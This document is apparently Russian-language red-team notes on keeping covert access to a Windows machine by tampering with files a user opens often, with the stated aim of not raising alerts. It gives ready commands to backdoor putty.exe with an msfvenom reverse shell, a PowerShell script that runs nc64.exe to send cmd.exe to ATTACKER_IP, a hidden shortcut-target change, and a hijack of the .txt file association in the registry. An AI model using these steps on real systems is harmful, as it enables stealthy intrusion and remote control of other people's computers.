# Метод заключается во вмешательстве в файлы, с которыми часто взаимодействует юзер. При этом мы не должны изменить их поведение и не вызвать алерты.

#### Executable Files ####
# Мы можем подменить исполняемый файл
## 1. Например мы нашли на рабочем столе файл Putty.exe, который явно используется часто.
# Через evil-winrm скачиваем файл
download C:\Program Files\PuTTY\putty.exe
## 2. Генерируем дополнительную полезную нагрузку для файла putty.exe, которая сработает при открытии файла пользователем
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
## 3. Подменяем легитимный файл на бэкдор. Теперь при каждом запуске будет прилетать reverse shell.

#### Shortcut Files ####
# Мы можем изменить ссылку на исполняемый файл(target) у ярлыка(shortcut).

## 1. В C:\Windows\System32 или другом скрытом место создаем скрипт с rev shell назовем backdoor.ps1
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
C:\Windows\System32\calc.exe
## 2. Нажимаем правой кнопкой на ярлык > shortcut > target и вписываем запуск нашего скрипт с добавлением WindowStyle hidden, для того, чтобы у пользователя запустилось скрытое окно.
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
## 3. Запускаем слушатель на атакующей машине, при двойном клике на ярлык нам прилетит обратное соединение, а затем у пользователя откроется калькулятор.

#### Hijacking File Associations ####
# Мы можем отправлять шелл, при каждом запуске файлов определенного типа

## 1. Переходим в Registry Editor, далее HKLM\Software\Classes\, далее выбираем желаемое расширение файл(например .txt)
## 2. Выбираем полный путь HKLM\Software\Classes\txtfile\shell\open\command и создаем файл в C:\Windows\System32\backdoor.ps1
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
## 3. Заменям ключ реестра для запуска бэкдора
powershell.exe -WindowStyle hidden C:\Windows\System32\back.ps1 %1
## 4. Запускаем слушатель на атакующей машине и на целевой машине открываем любой txt файл.